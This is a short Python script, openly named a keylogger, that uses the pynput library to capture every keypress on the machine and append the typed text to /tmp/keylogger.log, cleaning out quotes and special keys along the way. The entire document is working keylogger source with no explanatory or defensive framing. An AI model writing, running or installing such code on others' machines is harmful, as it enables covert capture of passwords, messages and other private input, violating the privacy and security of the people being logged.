import re
from pynput.keyboard import Listener

log = "/tmp/keylogger.log"

def capture(key):
    key = str(key)
    key = re.sub(r'\'', '', key)
    key = re.sub(r'Key.space', ' ', key)
    key = re.sub(r'Key.enter', '\n', key)
    key = re.sub(r'Key.*', '', key)
    #print(key)

    with open(log, "a") as l:
        l.write(key)

with Listener(on_press=capture) as l:
    l.join()